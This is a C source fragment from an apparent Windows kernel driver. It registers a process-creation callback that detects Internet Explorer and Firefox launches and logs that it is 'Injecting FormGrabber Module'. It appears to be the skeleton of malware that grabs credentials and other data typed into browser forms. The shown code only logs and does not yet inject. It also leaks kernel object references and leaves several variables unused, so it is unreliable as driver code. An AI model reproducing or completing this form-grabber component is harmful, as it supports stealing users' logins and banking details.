
extern UCHAR *PsGetProcessImageFileName(IN PEPROCESS Process); 
extern NTSTATUS NTAPI SeLocateProcessImageName(PEPROCESS Process,PUNICODE_STRING Name);

extern NTSTATUS PsLookupProcessByProcessId(
		HANDLE ProcessId,
		PEPROCESS *Process
		);

VOID 
ProcessCreationEventHandler(
		IN HANDLE hParentId, 
		IN HANDLE hProcessId, 
		IN BOOLEAN bCreate
		)
{
	NTSTATUS ntStatus;
	PEPROCESS pProc = 0;
	PUNICODE_STRING pusImageFileName = 0;
	PULONG plRetLen = 0;
	UNICODE_STRING usProcName, usIExplore, usFirefox;
	UCHAR* pucProcName;

	if(!bCreate) { 
		//TODO: When process is destroyed check if PID is whitelisted process, if so remove

		return;
	}

	if(PsLookupProcessByProcessId(hProcessId, &pProc) == STATUS_INVALID_PARAMETER) {
		DbgPrint("[IG Driver] Process Creation Handler called with Invalid PID");
		return;
	}

	ntStatus = SeLocateProcessImageName(pProc, &pusImageFileName);

	if(!NT_SUCCESS(ntStatus)) {
		DbgPrint("[IG Driver] SeLocateProcessImageName Error");
		return;
	}

	pucProcName = PsGetProcessImageFileName(pProc);

	if(strcmp(pucProcName, "iexplore.exe") == 0) {
		DbgPrint("[IG Driver] Internet Explorer Opened Injecting FormGrabber Module"); 	
	} else if(strcmp(pucProcName, "firefox.exe") == 0) {
		DbgPrint("[IG Driver] Firefox Opened Injecting FormGrabber Module");
	} 
}
